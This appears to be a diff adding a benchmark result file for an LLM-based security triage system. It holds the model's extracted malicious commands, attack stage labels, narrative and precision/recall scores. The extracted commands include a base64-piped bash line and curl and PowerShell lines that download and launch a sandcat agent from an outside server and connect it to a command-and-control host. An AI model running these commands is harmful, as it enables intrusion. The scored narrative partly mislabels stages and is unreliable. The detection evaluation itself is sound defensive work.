@@ -1,0 +1,75 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "curl -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "ssh -D -R",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Execution"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server h...",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -serve...",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attackers appear to be using a multi-stage approach to gain access and control over the system. The initial access occurs through the execution of an unknown base64 encoded script via bash, likely downloaded from an untrusted source. The Defence Evasion phase involves attempting to connect to a remote host to gather information, followed by establishing a reverse shell connection using SSH. The Execution phase sees the deployment of two different malware variants, SQLTool and SandCat, likely obtained through the initial access vector. These variants were executed via SQL queries and PowerShell scripts respectively. Finally, the Collection phase involves gathering data about the current user session, including IP addresses and system configurations. This suggests that the attackers aimed to exfiltrate sensitive information to further their goals.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 13223,
+      "completion_tokens": 796,
+      "total_tokens": 14019,
+      "wall_clock_s": 10.936,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.6666666666666666,
+      "recall": 0.5,
+      "f1": 0.5714285714285715,
+      "tp": 4,
+      "fp": 2,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.16666666666666666,
+      "recall": 0.14285714285714285,
+      "f1": 0.15384615384615383,
+      "tp": 1,
+      "fp": 5,
+      "fn": 6,
+      "recall_partial": 0.2857142857142857
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 13223,
+      "completion_tokens": 796,
+      "total_tokens": 14019,
+      "wall_clock_s": 10.936,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
